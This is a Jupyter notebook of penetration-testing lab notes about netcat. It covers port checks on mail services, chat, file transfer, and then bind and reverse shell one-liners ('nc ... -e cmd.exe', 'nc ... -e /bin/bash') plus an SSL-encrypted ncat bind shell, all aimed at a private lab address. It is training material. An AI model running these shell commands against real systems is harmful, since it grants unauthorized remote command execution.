{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Essential Tools"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Netcat\n",
    "• is a computer networking utility for reading from and writing to network connections using TCP or UDP# Netcat\n",
    "\n",
    "# Check if SMTP port is open \n",
    "$ nc -nv 192.168.56.101 25\n",
    "\n",
    "\n",
    "# Check  if POP3 port is open \n",
    "$ nc -nv 192.168.56.101 110\n",
    "\n",
    "# Check  if IMAP port is open \n",
    "$ nc -nv 192.168.56.101 143 \n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Netcat Chat\n",
    "\n",
    "# Set netcat in server mode and listen in port  4444t\n",
    "$ nc -nvlp 4444 \n",
    "\n",
    "# Set  netcat  as  a  tcp  client  to  connect  to  port  4444\n",
    "$ nc -nv 192.168.56.101 4444"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Netcat Transferring File \n",
    "\n",
    "# PC that wil receive the file\n",
    "$ nc -nvlp 4444 > incoming.exe (PC  that  will  receive) \n",
    "\n",
    "# PC that will trasfer the file\n",
    "$ nc -nv 192.168.56.101 < /usr/share/windows-binaries/wgwt.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Executing Commands"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Bind Shell\n",
    "\n",
    "# Windows PC\n",
    "$ nc -nvlp 4444 -e cmd.exe\n",
    "\n",
    "# Kali PC\n",
    "$ nc -nv 192.168.56.101 4444\n",
    "\n",
    "# Reverse Shell\n",
    "\n",
    "# Windows PC\n",
    "$ nc -nvlp 4444\n",
    "\n",
    "# Kali PC\n",
    "$ nc -nv 192.168.56.101 4444 -e /bin/bash"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Bind Shell Encrypted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Windows  PC \n",
    "$ C:\\Users\\sherwinowen>ncat  -lvp  4444  -e  cmd.exe  --allow 192.168.56.1 --ssl\n",
    "\n",
    "# Kali  PC \n",
    "$ ncat -v 192.168.56.101 4444 --ssl"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.4"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
